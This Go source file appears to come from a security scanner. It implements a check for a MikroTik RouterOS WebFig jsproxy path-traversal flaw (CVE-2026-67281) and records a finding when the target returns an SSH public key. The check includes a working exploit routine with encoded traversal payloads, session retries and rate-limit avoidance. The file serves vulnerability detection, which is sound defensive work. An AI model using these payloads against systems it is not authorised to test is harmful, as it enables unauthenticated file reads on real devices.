package cmd

import (
	"fmt"
	"strings"
	"time"

	"github.com/runZeroInc/sshamble/auth"
	"github.com/runZeroInc/sshamble/webfig"
)

const checkVulnMikrotikWebfigTraversal = "vuln-mikrotik-webfig-traversal"

// sshCheckVulnMikrotikWebfigTraversal attempts to read /id_rsa.pub from the
// target's WebFig jsproxy using the CVE-2026-67281 path-traversal vulnerability.
//
// The vulnerability allows an unauthenticated attacker to read arbitrary files
// by exploiting a stale/uninitialized principal pointer in newly allocated
// jsproxy sessions. The attacker establishes an X25519+AES-128-CTR session,
// then sends an encrypted GET with ".." components to escape the WebFig file
// namespace.
//
// Multiple traversal encodings are attempted to bypass path sanitization.
// Multiple sessions are attempted to increase the chance of hitting a session
// with a stale principal pointer (CWE-824).
func sshCheckVulnMikrotikWebfigTraversal(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
	tname := checkVulnMikrotikWebfigTraversal
	if !conf.IsCheckEnabled(tname) {
		return nil
	}

	conf.Logger.Debugf("%s %s is running", addr, tname)

	host := options.Host

	// Traversal paths to attempt, ordered by likelihood.
	// The webfig file root is typically /nova/bin/www/webfig/ on RouterOS,
	// so ../../ reaches /nova/bin/www/, ../../../ reaches /nova/bin/,
	// and ../../../../ reaches /nova/.
	paths := []string{
		"../../id_rsa.pub",
		"../../../id_rsa.pub",
		"../../../../id_rsa.pub",
		"../../../../../id_rsa.pub",
		"../../../../../../id_rsa.pub",
		// Double-URL-encoded traversal (server may decode after decrypt)
		"%2e%2e%2fid_rsa.pub",
		"%2e%2e%2f%2e%2e%2fid_rsa.pub",
		"%2e%2e%2f%2e%2e%2f%2e%2e%2fid_rsa.pub",
		// Overlong UTF-8 encoding of "."
		"%c0%ae%c0%ae/id_rsa.pub",
		"%c0%ae%c0%ae/%c0%ae%c0%ae/id_rsa.pub",
		// Backslash variant
		"..\\..\\id_rsa.pub",
		"..\\..\\..\\id_rsa.pub",
	}

	// Try up to 3 sessions to increase chance of hitting a stale principal.
	// Space sessions apart to avoid rate-limiting.
	for attempt := range 3 {
		if attempt > 0 {
			time.Sleep(2 * time.Second)
		}

		sess, err := webfig.Dial(host)
		if err != nil {
			conf.Logger.Debugf("%s %s webfig handshake attempt %d failed: %v", addr, tname, attempt+1, err)
			continue
		}

		// Try only the first few paths per session to avoid rate-limiting.
		// The server may close the connection after a failed traversal.
		maxPaths := 3
		if len(paths) < maxPaths {
			maxPaths = len(paths)
		}
		for pi := 0; pi < maxPaths; pi++ {
			path := paths[pi]
			status, data, err := sess.ReadFileStatus(path)
			if err != nil {
				conf.Logger.Debugf("%s %s traversal %q attempt %d failed: %v", addr, tname, path, attempt+1, err)
				// Server likely closed connection or rate-limited; stop this session.
				break
			}

			content := string(data)

			// Check if the response looks like an SSH public key
			if status == 200 && (strings.HasPrefix(content, "ssh-rsa ") ||
				strings.HasPrefix(content, "ssh-ed25519 ") ||
				strings.HasPrefix(content, "ecdsa-sha2-") ||
				strings.HasPrefix(content, "ssh-dss ")) {
				conf.Logger.Infof("%s %s successfully read %q (%d bytes) on attempt %d", addr, tname, path, len(data), attempt+1)

				root.AddVuln(auth.VulnResult{
					ID:    tname,
					Ref:   "CVE-2026-67281",
					URL:   "https://cert.pl/en/posts/2026/09/vulnerabilities-in-mikrotik-routeros-actively-exploited/",
					Proof: fmt.Sprintf("unauthenticated file read via WebFig jsproxy traversal (%s): %s", path, strings.TrimSpace(content)),
				})
				return nil
			}

			// Log unexpected successful responses for debugging
			if status == 200 && len(data) > 0 {
				conf.Logger.Debugf("%s %s traversal %q returned 200 with %d bytes (not a key): %s",
					addr, tname, path, len(data), strings.TrimSpace(content[:min(len(content), 200)]))
			}
		}
	}

	conf.Logger.Debugf("%s %s all traversal attempts across all sessions failed", addr, tname)
	return nil
}
